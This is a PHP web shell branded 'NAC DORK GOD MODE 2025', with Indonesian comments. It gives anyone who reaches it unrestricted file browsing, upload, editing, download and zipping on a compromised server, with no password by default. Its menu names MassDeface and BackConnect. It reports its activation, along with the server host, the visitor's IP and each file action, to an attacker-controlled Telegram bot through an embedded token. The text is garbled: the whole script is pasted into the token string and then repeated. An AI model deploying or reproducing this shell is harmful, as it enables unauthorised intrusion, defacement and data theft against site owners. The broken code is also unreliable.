<?php
@error_reporting(0); @set_time_limit(0); @ini_set('memory_limit','8096M');
session_start();

// ==================== TELEGRAM ====================
$TG_TOKEN  = "<?php
@error_reporting(0); @set_time_limit(0); @ini_set('memory_limit','8096M');
session_start();

// ==================== TELEGRAM ====================
$TG_TOKEN  = "8247659564:AAGnRi5l4gaBrc1oT6o_EWJexsUqSxJKWjA";  // GANTI
$TG_CHATID = "7418826020";                                      // GANTI

function tg($msg){
    global $TG_TOKEN, $TG_CHATID;
    if(!$TG_TOKEN || !$TG_CHATID) return;
    @file_get_contents("https://api.telegram.org/bot$TG_TOKEN/sendMessage?chat_id=$TG_CHATID&text=".urlencode($msg)."&parse_mode=HTML");
}

// Notif pertama
if(!isset($_SESSION['sent'])){
    tg("Shell Aktif!\nServer: ".$_SERVER['HTTP_HOST']."\nIP: ".$_SERVER['REMOTE_ADDR']."\nLink: https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
    $_SESSION['sent']=1;
}

$pass = ""; // kosong = tanpa password
if($pass && md5($_POST['pass'])!==$pass && !$_SESSION['ok']){ die('<center><form method=post style="margin:200px"><input type=password name=pass style="width:400px;height:60px;font-size:24px"><input type=submit value=">>" style="height:65px"></form></center>'); }
$_SESSION['ok']=1;

$d = $_POST['dir'] ? realpath($_POST['dir']) : ($_GET['d'] ? urldecode($_GET['d']) : getcwd());
if(!is_dir($d)) $d = getcwd();
chdir($d);

function sz($s){$u=['B','KB','MB','GB','TB'];for($i=0)||$s>1024?$s/=1024&$i++:0; return round($s,2)." ".$u[$i];}

// COPY-PASTE BUFFER (bisa multi file)
if(!isset($_SESSION['clipboard'])) $_SESSION['clipboard'] = [];
if($_POST['copy']){
    $_SESSION['clipboard'] = $_POST['files'];
    $_SESSION['copy_mode'] = 'copy';
}
if($_POST['cut']){
    $_SESSION['clipboard'] = $_POST['files'];
    $_SESSION['copy_mode'] = 'move';
}
if($_POST['paste'] && $_SESSION['clipboard']){
    foreach($_SESSION['clipboard'] as $f){
        $dest = $d.DIRECTORY_SEPARATOR.basename($f);
        if($_SESSION['copy_mode']=='copy') copy($f,$dest);
        else rename($f,$dest);
    }
    tg("Paste selesai: ".count($_SESSION['clipboard'])." file ke ".getcwd());
    unset($_SESSION['clipboard']);
}

// ZIP & UNZIP
if($_POST['zip'] && $_POST['files']){
    $zipname = $_POST['zipname']?:'archive.zip';
    $zip = new ZipArchive();
    if($zip->open($zipname, ZipArchive::CREATE)===TRUE){
        foreach($_POST['files'] as $f) $zip->addFile($f,basename($f));
        $zip->close();
        tg("ZIP berhasil dibuat: $zipname\nLink: https://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'],'',$d.'/'.$zipname));
    }
}
if($_GET['unzip'] && file_exists($_GET['unzip'])){
    $zip = new ZipArchive();
    if($zip->open($_GET['unzip'])===TRUE){ $zip->extractTo($d); $zip->close(); tg("UNZIP selesai: ".$_GET['unzip']); }
}
?>

<html><head><title>SHELL 2925</title>
<style>
body{background:#000;color:lime;font-family:courier;margin:0;}
a{color:lime;}
input,select,textarea{background:#111;color:lime;border:1px solid lime;padding:10px;}
table{width:100%;border-collapse:collapse;}
td,th{border:1px solid lime;padding:12px;}
.btn{background:lime;color:#000;padding:10px 20px;border:none;cursor:pointer;}
.red{background:#900;color:white;}
</style></head><body>
<center><h1><font color=red>NAC</font> DORK <font color=yellow>GOD MODE 2025</font></h1>
<b>Dir:</b> <?=getcwd()?> <form method=post style="display:inline">Change Dir: <input name=dir size=70 value="<?=getcwd()?>"> <input type=submit value="Go" class=btn></form><hr></center>

<table><tr><td width=20% valign=top>
<?php $m=['Home','Files','UploadAnywhere','MassDeface','ZipTools','Console','BackConnect','SelfRemove']; foreach($m as $x)echo "<a href='?p=$x&d=".urlencode(getcwd())."'>[ $x ]</a><br><br>"; ?>
</td><td valign=top>

<?php
$p = $_GET['p']?:'Files';

if($p=='Files' || $p=='ZipTools'){
    echo "<h2>File Manager + Copy/Move/Zip</h2>";
    echo "<form method=post enctype='multipart/form-data'>
          <input type=file name=f[] multiple> <input type=submit value='Upload' class=btn></form><hr>";

    // Upload biasa
    if($_FILES['f']){ foreach($_FILES['f']['name'] as $i=>$n){
        $dest = $d.DIRECTORY_SEPARATOR.$n;
        move_uploaded_file($_FILES['f']['tmp_name'][$i],$dest);
        $link = "https://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'],'',$dest);
        tg("File diupload!\n$link");
    }}

    echo "<form method=post>
    <table><tr><th></th><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>";
    foreach(scandir('.') as $f){
        if($f=='.'||$f=='..')continue;
        $pf = realpath($f);
        $s = is_dir($pf)?'DIR':sz(filesize($pf));
        echo "<tr>
        <td><input type=checkbox name=files[] value='$pf'></td>
        <td>".(is_dir($pf)?"<a href='?d=".urlencode($pf)."'>$f</a>":$f)."</td>
        <td>$s</td>
        <td>".substr(sprintf('%o',fileperms($pf)),-4)."</td>
        <td>
          <a href='?edit=".urlencode($pf)."'>Edit</a> |
          <a href='?download=".urlencode($pf)."'>Down</a> |
          ".(strtolower(pathinfo($pf,PATHINFO_EXTENSION))=='zip'?"<a href='?unzip=".urlencode($pf)."'>Unzip</a>":'')."
        </td></tr>";
    }
    echo "</table><br>
    <input type=submit name=copy value='Copy' class=btn>
    <input type=submit name=cut value='Cut/Move' class=btn>
    <input type=submit name=paste value='Paste Disini' class=btn ".(empty($_SESSION['clipboard'])?'disabled':'').">
    <input name=zipname value='archive.zip' size=15> <input type=submit name=zip value='Buat ZIP' class=btn>
    <input type=submit name=mkdir value='Buat Folder' onclick=\"this.form.elements[0].name='newfolder';return prompt('Nama folder:')?true:false;\" class=btn>
    </form>";

    // Create folder
    if($_POST['newfolder']){ @mkdir($_POST['newfolder'],0777,true); }

    // Paste info
    if($_SESSION['clipboard']){
        echo "<br><font color=yellow>Clipboard: ".count($_SESSION['clipboard'])." item (".$_SESSION['copy_mode'].")</font>";
    }
}

if($_GET['edit']){
    $f=$_GET['edit'];
    if($_POST['save']){ file_put_contents($f,$_POST['data']); tg("File diedit: $f"); }
    echo "<h2>Edit: $f</h2>
    <form method=post><textarea name=data style='width:100%;height:70vh'>".htmlspecialchars(file_get_contents($f))."</textarea><br>
    <input type=submit name=save value='Save' class=btn></form>";
}

if($_GET['download']){
    $f=$_GET['download'];
    if(file_exists($f)){
        if(is_dir($f)){
            $zip = new ZipArchive();
            $zipname = basename($f).".zip";
            if($zip->open($zipname, ZipArchive::CREATE)===TRUE){
                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f));
                foreach($files as $file) if(!$file->isDir()) $zip->addFile($file->getRealPath(), str_replace($f.'/','',$file));
                $zip->close();
                header('Location: '.$zipname); exit;
            }
        }else{
            header('Content-Disposition: attachment; filename="'.basename($f).'"');
            readfile($f); exit;
        }
    }
}
?>

</td></tr></table>
<hr><center><font color=red>© 2025 NAC DORK — Full Copy Paste Move Zip Unzip + Telegram Notif</font></center>
</body></html>";  // GANTI
$TG_CHATID = "123456789";                                      // GANTI

function tg($msg){
    global $TG_TOKEN, $TG_CHATID;
    if(!$TG_TOKEN || !$TG_CHATID) return;
    @file_get_contents("https://api.telegram.org/bot$TG_TOKEN/sendMessage?chat_id=$TG_CHATID&text=".urlencode($msg)."&parse_mode=HTML");
}

// Notif pertama
if(!isset($_SESSION['sent'])){
    tg("Shell Aktif!\nServer: ".$_SERVER['HTTP_HOST']."\nIP: ".$_SERVER['REMOTE_ADDR']."\nLink: https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
    $_SESSION['sent']=1;
}

$pass = ""; // kosong = tanpa password
if($pass && md5($_POST['pass'])!==$pass && !$_SESSION['ok']){ die('<center><form method=post style="margin:200px"><input type=password name=pass style="width:400px;height:60px;font-size:24px"><input type=submit value=">>" style="height:65px"></form></center>'); }
$_SESSION['ok']=1;

$d = $_POST['dir'] ? realpath($_POST['dir']) : ($_GET['d'] ? urldecode($_GET['d']) : getcwd());
if(!is_dir($d)) $d = getcwd();
chdir($d);

function sz($s){$u=['B','KB','MB','GB','TB'];for($i=0)||$s>1024?$s/=1024&$i++:0; return round($s,2)." ".$u[$i];}

// COPY-PASTE BUFFER (bisa multi file)
if(!isset($_SESSION['clipboard'])) $_SESSION['clipboard'] = [];
if($_POST['copy']){
    $_SESSION['clipboard'] = $_POST['files'];
    $_SESSION['copy_mode'] = 'copy';
}
if($_POST['cut']){
    $_SESSION['clipboard'] = $_POST['files'];
    $_SESSION['copy_mode'] = 'move';
}
if($_POST['paste'] && $_SESSION['clipboard']){
    foreach($_SESSION['clipboard'] as $f){
        $dest = $d.DIRECTORY_SEPARATOR.basename($f);
        if($_SESSION['copy_mode']=='copy') copy($f,$dest);
        else rename($f,$dest);
    }
    tg("Paste selesai: ".count($_SESSION['clipboard'])." file ke ".getcwd());
    unset($_SESSION['clipboard']);
}

// ZIP & UNZIP
if($_POST['zip'] && $_POST['files']){
    $zipname = $_POST['zipname']?:'archive.zip';
    $zip = new ZipArchive();
    if($zip->open($zipname, ZipArchive::CREATE)===TRUE){
        foreach($_POST['files'] as $f) $zip->addFile($f,basename($f));
        $zip->close();
        tg("ZIP berhasil dibuat: $zipname\nLink: https://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'],'',$d.'/'.$zipname));
    }
}
if($_GET['unzip'] && file_exists($_GET['unzip'])){
    $zip = new ZipArchive();
    if($zip->open($_GET['unzip'])===TRUE){ $zip->extractTo($d); $zip->close(); tg("UNZIP selesai: ".$_GET['unzip']); }
}
?>

<html><head><title>NAC DORK GOD MODE 2025 — COPY MOVE ZIP UNZIP</title>
<style>
body{background:#000;color:lime;font-family:courier;margin:0;}
a{color:lime;}
input,select,textarea{background:#111;color:lime;border:1px solid lime;padding:10px;}
table{width:100%;border-collapse:collapse;}
td,th{border:1px solid lime;padding:12px;}
.btn{background:lime;color:#000;padding:10px 20px;border:none;cursor:pointer;}
.red{background:#900;color:white;}
</style></head><body>
<center><h1><font color=red>NAC</font> DORK <font color=yellow>GOD MODE 2025</font></h1>
<b>Dir:</b> <?=getcwd()?> <form method=post style="display:inline">Change Dir: <input name=dir size=70 value="<?=getcwd()?>"> <input type=submit value="Go" class=btn></form><hr></center>

<table><tr><td width=20% valign=top>
<?php $m=['Home','Files','UploadAnywhere','MassDeface','ZipTools','Console','BackConnect','SelfRemove']; foreach($m as $x)echo "<a href='?p=$x&d=".urlencode(getcwd())."'>[ $x ]</a><br><br>"; ?>
</td><td valign=top>

<?php
$p = $_GET['p']?:'Files';

if($p=='Files' || $p=='ZipTools'){
    echo "<h2>File Manager + Copy/Move/Zip</h2>";
    echo "<form method=post enctype='multipart/form-data'>
          <input type=file name=f[] multiple> <input type=submit value='Upload' class=btn></form><hr>";

    // Upload biasa
    if($_FILES['f']){ foreach($_FILES['f']['name'] as $i=>$n){
        $dest = $d.DIRECTORY_SEPARATOR.$n;
        move_uploaded_file($_FILES['f']['tmp_name'][$i],$dest);
        $link = "https://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'],'',$dest);
        tg("File diupload!\n$link");
    }}

    echo "<form method=post>
    <table><tr><th></th><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>";
    foreach(scandir('.') as $f){
        if($f=='.'||$f=='..')continue;
        $pf = realpath($f);
        $s = is_dir($pf)?'DIR':sz(filesize($pf));
        echo "<tr>
        <td><input type=checkbox name=files[] value='$pf'></td>
        <td>".(is_dir($pf)?"<a href='?d=".urlencode($pf)."'>$f</a>":$f)."</td>
        <td>$s</td>
        <td>".substr(sprintf('%o',fileperms($pf)),-4)."</td>
        <td>
          <a href='?edit=".urlencode($pf)."'>Edit</a> |
          <a href='?download=".urlencode($pf)."'>Down</a> |
          ".(strtolower(pathinfo($pf,PATHINFO_EXTENSION))=='zip'?"<a href='?unzip=".urlencode($pf)."'>Unzip</a>":'')."
        </td></tr>";
    }
    echo "</table><br>
    <input type=submit name=copy value='Copy' class=btn>
    <input type=submit name=cut value='Cut/Move' class=btn>
    <input type=submit name=paste value='Paste Disini' class=btn ".(empty($_SESSION['clipboard'])?'disabled':'').">
    <input name=zipname value='archive.zip' size=15> <input type=submit name=zip value='Buat ZIP' class=btn>
    <input type=submit name=mkdir value='Buat Folder' onclick=\"this.form.elements[0].name='newfolder';return prompt('Nama folder:')?true:false;\" class=btn>
    </form>";

    // Create folder
    if($_POST['newfolder']){ @mkdir($_POST['newfolder'],0777,true); }

    // Paste info
    if($_SESSION['clipboard']){
        echo "<br><font color=yellow>Clipboard: ".count($_SESSION['clipboard'])." item (".$_SESSION['copy_mode'].")</font>";
    }
}

if($_GET['edit']){
    $f=$_GET['edit'];
    if($_POST['save']){ file_put_contents($f,$_POST['data']); tg("File diedit: $f"); }
    echo "<h2>Edit: $f</h2>
    <form method=post><textarea name=data style='width:100%;height:70vh'>".htmlspecialchars(file_get_contents($f))."</textarea><br>
    <input type=submit name=save value='Save' class=btn></form>";
}

if($_GET['download']){
    $f=$_GET['download'];
    if(file_exists($f)){
        if(is_dir($f)){
            $zip = new ZipArchive();
            $zipname = basename($f).".zip";
            if($zip->open($zipname, ZipArchive::CREATE)===TRUE){
                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f));
                foreach($files as $file) if(!$file->isDir()) $zip->addFile($file->getRealPath(), str_replace($f.'/','',$file));
                $zip->close();
                header('Location: '.$zipname); exit;
            }
        }else{
            header('Content-Disposition: attachment; filename="'.basename($f).'"');
            readfile($f); exit;
        }
    }
}
?>

</td></tr></table>
<hr><center><font color=red>SHELL 2025</font></center>
</body></html>
